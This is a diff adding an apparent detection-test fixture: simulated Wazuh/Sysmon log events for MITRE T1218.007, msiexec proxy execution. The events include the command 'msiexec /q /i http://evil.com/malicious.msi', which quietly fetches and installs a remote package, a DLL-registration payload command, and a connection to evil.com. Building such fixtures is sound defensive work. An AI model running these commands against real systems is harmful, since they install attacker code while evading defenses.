@@ -1,0 +1,230 @@
+{
+  "_metadata": {
+    "attack_id": "T1218.007",
+    "variation": "001",
+    "name": "Msiexec",
+    "description": "Using msiexec to execute malicious MSI packages",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "defense-evasion",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - msiexec remote MSI execution",
+      "sequence": 1,
+      "timestamp": "2026-01-30T08:25:00.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Msiexec Remote Package Execution",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1218.007"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Msiexec"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000045.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 08:25:00.000",
+              "processGuid": "{MSI-001-0001-000000000001}",
+              "processId": "90000",
+              "image": "C:\\Windows\\System32\\msiexec.exe",
+              "commandLine": "msiexec /q /i http://evil.com/malicious.msi",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=MSIEXEC_HASH_1234567890ABCDEF1234567890ABCDEF12",
+              "parentProcessGuid": "{MSI-001-0001-000000000000}",
+              "parentProcessId": "90000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - msiexec DLL execution",
+      "sequence": 2,
+      "timestamp": "2026-01-30T08:25:05.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Msiexec DLL Execution",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1218.007"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Msiexec"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000045.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 08:25:05.000",
+              "processGuid": "{MSI-001-0001-000000000002}",
+              "processId": "90100",
+              "image": "C:\\Windows\\System32\\msiexec.exe",
+              "commandLine": "msiexec /y C:\\Temp\\payload.dll",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=MSIEXEC_HASH_1234567890ABCDEF1234567890ABCDEF12",
+              "parentProcessGuid": "{MSI-001-0001-000000000000}",
+              "parentProcessId": "90000",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - msiexec network connection",
+      "sequence": 3,
+      "timestamp": "2026-01-30T08:25:01.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 3: Msiexec Network Connection",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1218.007"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Msiexec"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000045.000003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 08:25:01.000",
+              "processGuid": "{MSI-001-0001-000000000001}",
+              "processId": "90000",
+              "image": "C:\\Windows\\System32\\msiexec.exe",
+              "user": "CORP\\attacker",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "198.51.100.20",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "51234",
+              "destinationIsIpv6": "false",
+              "destinationIp": "185.220.101.200",
+              "destinationHostname": "evil.com",
+              "destinationPort": "80",
+              "destinationPortName": "http"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
